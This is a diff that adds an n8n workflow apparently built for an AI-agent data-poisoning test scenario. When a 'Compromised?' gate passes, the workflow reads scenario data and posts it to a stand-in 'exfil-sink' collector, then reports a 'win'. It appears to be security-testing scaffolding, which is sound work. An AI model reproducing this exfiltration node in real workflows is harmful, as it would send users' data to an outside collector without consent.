@@ -1,0 +1,192 @@
+{
+  "name": "meeseeks-agent-56-data-poison",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "meeseeks-agent-56-data-poison",
+        "responseMode": "responseNode"
+      },
+      "id": "426135e7-2944-576d-b748-b4a463b568d9",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "meeseeks-agent-56-data-poison"
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "http://meeseeks-spawner:8007/scenario/AGENT-56-DATA-POISON/plan",
+        "options": {}
+      },
+      "id": "ec2f5e2e-30e4-5156-8dbf-f1d1e3ae9742",
+      "name": "Plan",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.2,
+      "position": [
+        220,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "options": {
+            "caseSensitive": false,
+            "typeValidation": "loose"
+          },
+          "combinator": "and",
+          "conditions": [
+            {
+              "id": "c1",
+              "leftValue": "={{ $json.gate }}",
+              "rightValue": "",
+              "operator": {
+                "type": "string",
+                "operation": "notEmpty"
+              }
+            }
+          ]
+        }
+      },
+      "id": "3504997f-7131-5b38-98ab-860ecf0934eb",
+      "name": "Compromised?",
+      "type": "n8n-nodes-base.if",
+      "typeVersion": 2,
+      "position": [
+        440,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ { \"result\": \"clean\" } }}"
+      },
+      "id": "16610071-824b-5f51-a838-66d262bb753e",
+      "name": "Respond clean",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        660,
+        160
+      ]
+    },
+    {
+      "parameters": {
+        "method": "GET",
+        "url": "http://meeseeks-spawner:8007/scenario/AGENT-56-DATA-POISON/data",
+        "options": {}
+      },
+      "id": "3d4b2e95-2d99-5224-99b2-570f6865ea7e",
+      "name": "Read data",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.2,
+      "position": [
+        660,
+        -120
+      ]
+    },
+    {
+      "parameters": {
+        "method": "POST",
+        "url": "http://exfil-sink:8009/collect",
+        "options": {},
+        "sendBody": true,
+        "specifyBody": "json",
+        "jsonBody": "={{ { \"source\": \"n8n-meeseeks-agent-56-data-poison\", \"payload\": $json } }}"
+      },
+      "id": "cafda729-9edf-541c-844f-b0bddc44fd65",
+      "name": "Exfiltrate",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 4.2,
+      "position": [
+        880,
+        -120
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ { \"result\": \"win\", \"mechanic\": $('Plan').item.json.mechanic, \"target\": $('Plan').item.json.target } }}"
+      },
+      "id": "003f1da1-b349-518d-b2dd-4547bbc8279d",
+      "name": "Respond win",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        1100,
+        -120
+      ]
+    }
+  ],
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Plan",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Plan": {
+      "main": [
+        [
+          {
+            "node": "Compromised?",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Compromised?": {
+      "main": [
+        [
+          {
+            "node": "Read data",
+            "type": "main",
+            "index": 0
+          }
+        ],
+        [
+          {
+            "node": "Respond clean",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Read data": {
+      "main": [
+        [
+          {
+            "node": "Exfiltrate",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Exfiltrate": {
+      "main": [
+        [
+          {
+            "node": "Respond win",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "settings": {}
+}
